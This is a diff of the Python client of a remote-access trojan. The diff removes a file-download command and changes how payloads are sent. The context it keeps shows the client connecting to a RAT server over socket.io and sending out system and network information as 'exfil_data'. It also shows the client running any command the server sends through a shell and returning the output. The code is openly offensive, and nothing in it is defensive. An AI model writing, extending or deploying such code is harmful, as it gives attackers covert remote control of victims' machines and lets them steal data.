@@ -4,7 +4,6 @@ import subprocess
 import json
 import time
 import os
-import urllib.request
 from socketio import Client
 import netifaces
 
@@ -41,14 +40,6 @@ def get_network_info():
                 network_info[iface] = addr.get("addr", "Unknown")
     return network_info
 
-def download_file(url, dest_path):
-    """Download a file from the server."""
-    try:
-        urllib.request.urlretrieve(url, dest_path)
-        return f"File downloaded to {dest_path}"
-    except Exception as e:
-        return f"Error downloading file: {e}"
-
 def execute_command(command):
     """Execute a system command and return the output based on current directory."""
     try:
@@ -63,11 +54,6 @@ def execute_command(command):
             target_dir = os.path.normpath(target_dir)
             os.chdir(target_dir)
             return f"Changed directory to {os.getcwd()}"
-        elif command.strip().lower().startswith("download "):
-            filename = command.strip().split("download ", 1)[1].strip()
-            download_url = f"{SERVER_URL}/download/{filename}"
-            dest_path = os.path.join(os.getcwd(), filename)
-            return download_file(download_url, dest_path)
         else:
             result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
             return result.stdout + result.stderr
@@ -87,7 +73,7 @@ def main():
                 "network": network_info,
                 "type": "system_info"
             }
-            sio.emit('exfil_data', {'data': json.dumps(exfil_data)})  # Explicit data key
+            sio.emit('exfil_data', json.dumps(exfil_data))
             print("[*] Exfiltrated data sent to RAT server")
 
         @sio.event
@@ -107,12 +93,12 @@ def main():
                 return
             output = execute_command(data)
             print(f"[*] Executed command: {data}")
-            sio.emit('exfil_data', {'data': json.dumps({
+            sio.emit('exfil_data', json.dumps({
                 "type": "command_output",
                 "command": data,
                 "output": output,
                 "current_dir": os.getcwd()
-            })})  # Explicit data key
+            }))
 
         while True:
             try:
